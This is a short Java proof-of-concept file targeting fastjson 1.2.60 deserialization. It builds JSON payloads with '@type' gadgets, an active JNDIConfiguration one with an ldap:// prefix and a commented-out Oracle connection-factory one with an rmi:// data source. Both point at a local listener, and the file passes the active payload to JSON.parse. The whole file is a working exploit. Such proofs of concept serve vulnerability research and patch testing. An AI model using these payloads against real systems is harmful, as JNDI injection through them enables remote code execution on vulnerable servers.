package com.firebasky.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Poc_1_2_60 {
    public static void main(String[] args) {
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //String poc = "{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://127.0.0.1:2333/test\"}";
        String poc ="{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://127.0.0.1:2333/\"}";
        JSON.parse(poc);
    }
}
